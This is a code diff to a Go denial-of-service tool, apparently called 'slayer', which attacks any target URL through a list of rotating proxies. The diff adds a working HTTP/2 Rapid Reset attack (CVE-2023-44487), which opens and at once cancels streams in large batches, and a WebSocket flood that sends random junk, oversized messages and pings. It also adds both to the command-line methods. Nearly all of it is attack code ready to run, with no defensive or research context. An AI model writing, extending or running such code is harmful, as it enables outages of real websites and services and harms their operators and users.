@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"bytes"
 	"crypto/tls"
 	"encoding/base64"
 	"flag"
@@ -17,6 +18,10 @@ import (
 	"strings"
 	"sync/atomic"
 	"time"
+
+	"github.com/gorilla/websocket"
+	"golang.org/x/net/http2"
+	"golang.org/x/net/http2/hpack"
 )
 
 func loadProxies(filename string) ([]string, error) {
@@ -280,6 +285,286 @@ func httpRudy(targetURL string, client *http.Client, stop <-chan struct{}) error
 
 var totalSent atomic.Int64
 var totalErrors atomic.Int64
+var proxyList []string // set in main, used by rapid reset
+
+// ── HTTP/2 Rapid Reset (CVE-2023-44487) ──
+
+func httpRapidReset(targetURL string, stop <-chan struct{}) error {
+	u, err := url.Parse(targetURL)
+	if err != nil {
+		return err
+	}
+
+	host := u.Hostname()
+	port := u.Port()
+	if port == "" {
+		if u.Scheme == "https" {
+			port = "443"
+		} else {
+			port = "443" // force TLS for h2
+		}
+	}
+	addr := net.JoinHostPort(host, port)
+
+	// Dial — through proxy CONNECT tunnel or direct
+	var rawConn net.Conn
+	if len(proxyList) > 0 {
+		proxy := proxyList[rand.Intn(len(proxyList))]
+		pURL, err := url.Parse(proxy)
+		if err != nil {
+			return err
+		}
+		rawConn, err = net.DialTimeout("tcp", pURL.Host, 5*time.Second)
+		if err != nil {
+			return err
+		}
+
+		// Build CONNECT request
+		connectReq := "CONNECT " + addr + " HTTP/1.1\r\nHost: " + addr + "\r\n"
+		if pURL.User != nil {
+			user := pURL.User.Username()
+			pass, _ := pURL.User.Password()
+			cred := base64.StdEncoding.EncodeToString([]byte(user + ":" + pass))
+			connectReq += "Proxy-Authorization: Basic " + cred + "\r\n"
+		}
+		connectReq += "\r\n"
+
+		if _, err := rawConn.Write([]byte(connectReq)); err != nil {
+			rawConn.Close()
+			return err
+		}
+
+		br := bufio.NewReader(rawConn)
+		resp, err := http.ReadResponse(br, nil)
+		if err != nil {
+			rawConn.Close()
+			return fmt.Errorf("CONNECT failed: %w", err)
+		}
+		resp.Body.Close()
+		if resp.StatusCode != 200 {
+			rawConn.Close()
+			return fmt.Errorf("CONNECT returned %d", resp.StatusCode)
+		}
+	} else {
+		rawConn, err = net.DialTimeout("tcp", addr, 5*time.Second)
+		if err != nil {
+			return err
+		}
+	}
+
+	// TLS handshake with ALPN h2
+	tlsConn := tls.Client(rawConn, &tls.Config{
+		ServerName:         host,
+		NextProtos:         []string{"h2"},
+		InsecureSkipVerify: true,
+	})
+	if err := tlsConn.Handshake(); err != nil {
+		rawConn.Close()
+		return err
+	}
+	defer tlsConn.Close()
+
+	if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
+		return fmt.Errorf("h2 not negotiated")
+	}
+
+	// HTTP/2 client connection preface
+	if _, err := tlsConn.Write([]byte(http2.ClientPreface)); err != nil {
+		return err
+	}
+
+	// Buffered framer — batch frames before flushing to wire
+	bw := bufio.NewWriterSize(tlsConn, 65536)
+	framer := http2.NewFramer(bw, tlsConn)
+	framer.AllowIllegalWrites = true
+
+	// Send initial SETTINGS
+	framer.WriteSettings(
+		http2.Setting{ID: http2.SettingMaxConcurrentStreams, Val: 1000},
+		http2.Setting{ID: http2.SettingInitialWindowSize, Val: 65535},
+	)
+	bw.Flush()
+
+	// Background reader — consume server frames so the connection doesn't stall
+	connDone := make(chan struct{})
+	go func() {
+		defer close(connDone)
+		for {
+			f, err := framer.ReadFrame()
+			if err != nil {
+				return
+			}
+			switch sf := f.(type) {
+			case *http2.SettingsFrame:
+				if !sf.IsAck() {
+					framer.WriteSettingsAck()
+					bw.Flush()
+				}
+			case *http2.GoAwayFrame:
+				return // server rejected us
+			}
+		}
+	}()
+
+	// HPACK encoder for pseudo-headers
+	var hdrBuf bytes.Buffer
+	enc := hpack.NewEncoder(&hdrBuf)
+
+	path := u.RequestURI()
+	if path == "" {
+		path = "/"
+	}
+	scheme := u.Scheme
+	if scheme == "" || scheme == "http" {
+		scheme = "https"
+	}
+	authority := u.Host
+
+	var streamID uint32 = 1
+	const batchSize = 100 // flush every 100 HEADERS+RST pairs
+
+	for {
+		select {
+		case <-stop:
+			return nil
+		case <-connDone:
+			return fmt.Errorf("connection closed by server")
+		default:
+		}
+
+		for i := 0; i < batchSize; i++ {
+			hdrBuf.Reset()
+			enc.WriteField(hpack.HeaderField{Name: ":method", Value: "GET"})
+			enc.WriteField(hpack.HeaderField{Name: ":path", Value: path})
+			enc.WriteField(hpack.HeaderField{Name: ":scheme", Value: scheme})
+			enc.WriteField(hpack.HeaderField{Name: ":authority", Value: authority})
+			enc.WriteField(hpack.HeaderField{Name: "user-agent", Value: "Mozilla/5.0"})
+
+			if err := framer.WriteHeaders(http2.HeadersFrameParam{
+				StreamID:      streamID,
+				BlockFragment: hdrBuf.Bytes(),
+				EndStream:     true,
+				EndHeaders:    true,
+			}); err != nil {
+				return err
+			}
+
+			if err := framer.WriteRSTStream(streamID, http2.ErrCodeCancel); err != nil {
+				return err
+			}
+
+			totalSent.Add(1)
+			streamID += 2
+
+			if streamID >= 1<<31-1 {
+				bw.Flush()
+				return nil // stream IDs exhausted — worker will reconnect
+			}
+		}
+		bw.Flush()
+	}
+}
+
+// ── WebSocket Flood ──
+
+func wsFlood(targetURL string, stop <-chan struct{}) error {
+	// Convert http(s) to ws(s)
+	wsURL := targetURL
+	if strings.HasPrefix(wsURL, "http://") {
+		wsURL = "ws://" + wsURL[7:]
+	} else if strings.HasPrefix(wsURL, "https://") {
+		wsURL = "wss://" + wsURL[8:]
+	} else if !strings.HasPrefix(wsURL, "ws://") && !strings.HasPrefix(wsURL, "wss://") {
+		wsURL = "ws://" + wsURL
+	}
+
+	// Proxy setup
+	var proxyURL *url.URL
+	if len(proxyList) > 0 {
+		proxy := proxyList[rand.Intn(len(proxyList))]
+		var err error
+		proxyURL, err = url.Parse(proxy)
+		if err != nil {
+			return err
+		}
+	}
+
+	dialer := websocket.Dialer{
+		HandshakeTimeout: 10 * time.Second,
+		TLSClientConfig: &tls.Config{
+			InsecureSkipVerify: true,
+		},
+	}
+	if proxyURL != nil {
+		dialer.Proxy = func(req *http.Request) (*url.URL, error) {
+			return proxyURL, nil
+		}
+	}
+
+	headers := http.Header{}
+	headers.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
+	headers.Set("Origin", targetURL)
+
+	conn, _, err := dialer.Dial(wsURL, headers)
+	if err != nil {
+		return err
+	}
+	defer conn.Close()
+
+	// Drain incoming messages in background so pongs are handled
+	go func() {
+		for {
+			if _, _, err := conn.ReadMessage(); err != nil {
+				return
+			}
+		}
+	}()
+
+	// Flood: mix of text messages, binary junk, and pings
+	for {
+		select {
+		case <-stop:
+			conn.WriteMessage(websocket.CloseMessage,
+				websocket.FormatCloseMessage(websocket.CloseNormalClosure, ""))
+			return nil
+		default:
+		}
+
+		var err error
+		switch rand.Intn(5) {
+		case 0:
+			// Text message — random JSON-like payload
+			msg := fmt.Sprintf(`{"action":"%s","data":"%s","ts":%d}`,
+				randString(8), randString(200+rand.Intn(2000)), time.Now().UnixNano())
+			err = conn.WriteMessage(websocket.TextMessage, []byte(msg))
+		case 1:
+			// Binary junk — 1-8 KB
+			data := make([]byte, 1024+rand.Intn(7168))
+			rand.Read(data)
+			err = conn.WriteMessage(websocket.BinaryMessage, data)
+		case 2:
+			// Ping flood
+			err = conn.WriteMessage(websocket.PingMessage, []byte(randString(16)))
+		case 3:
+			// Large text — 10-50 KB of garbage
+			err = conn.WriteMessage(websocket.TextMessage, []byte(randString(10240+rand.Intn(40960))))
+		case 4:
+			// Rapid small messages — burst 10 tiny frames
+			for j := 0; j < 10; j++ {
+				if e := conn.WriteMessage(websocket.TextMessage, []byte(randString(16))); e != nil {
+					err = e
+					break
+				}
+				totalSent.Add(1)
+			}
+		}
+
+		if err != nil {
+			return err // connection died — Worker will reconnect
+		}
+		totalSent.Add(1)
+	}
+}
 
 // ── API/JSON POST Flood ──
 
@@ -410,6 +695,12 @@ func Worker(targetURL string, method string, clients []*http.Client, stop <-chan
 			err = httpRudy(targetURL, client, stop)
 		case "apiflood":
 			err = httpAPIFlood(targetURL, client)
+		case "rapidreset":
+			// Raw HTTP/2 — bypasses http.Client entirely
+			err = httpRapidReset(targetURL, stop)
+		case "wsflood":
+			// WebSocket connection + message flood
+			err = wsFlood(targetURL, stop)
 		}
 
 		if err != nil {
@@ -421,7 +712,7 @@ func Worker(targetURL string, method string, clients []*http.Client, stop <-chan
 }
 func main() {
 	target := flag.String("t", "", "target URL (e.g. http://1.2.3.4)")
-	method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood")
+	method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood")
 	workerCount := flag.Int("w", 2048, "number of workers")
 	dur := flag.Int("d", 30, "duration in seconds")
 	pFile := flag.String("p", "resi.txt", "proxy file path")
@@ -442,7 +733,7 @@ func main() {
                          \$$    $$                                                         
                           \$$$$$$`)
 		fmt.Println("\n  Usage: slayer -t <url> [-m method] [-w workers] [-d duration] [-p proxyfile]")
-		fmt.Println("  Methods: httpget | httppost | rudy | apiflood")
+		fmt.Println("  Methods: httpget | httppost | rudy | apiflood | rapidreset | wsflood")
 		fmt.Println()
 		flag.PrintDefaults()
 		os.Exit(1)
@@ -469,6 +760,7 @@ func main() {
 		log.Fatalf("failed to load proxies: %v", err)
 	}
 	fmt.Printf("  Loaded %d proxies\n", len(proxies))
+	proxyList = proxies // expose for rapid reset raw dialing
 
 	clients, err := buildClientPool(proxies)
 	if err != nil {
